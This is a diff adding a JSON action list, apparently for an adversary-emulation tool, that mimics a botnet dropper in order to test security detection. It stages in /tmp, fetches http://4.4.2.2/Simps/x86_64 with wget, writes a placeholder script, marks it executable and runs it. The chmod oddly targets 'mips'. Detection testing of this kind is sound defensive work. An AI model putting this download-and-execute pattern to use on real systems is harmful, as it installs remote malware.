@@ -1,0 +1,20 @@
+[
+  {
+    "name": "DELETE-BOT",
+    "remove": [ "./x86_64" ]
+  },
+  {
+    "name": "DOWNLOAD-BOT",
+    "fork-and-rename": [ "wget", "http://4.4.2.2/Simps/x86_64" ],
+    "file-create": { "path": "/tmp/x86_64", "data": "#!/bin/sh\nchain-reactor DDoS Botnet test\n", "backup-and-revert": false },
+    "chmod": { "path": "mips", "mode": "755" }
+  },
+  {
+    "name": "EXECUTE-BOT",
+    "fork-and-rename": [ "./x86_64", "x86_64" ]
+  },
+  {
+    "name": "STAGE-DIRECTORY",
+    "execve": [ "cd", "/tmp/" ]
+  }
+]
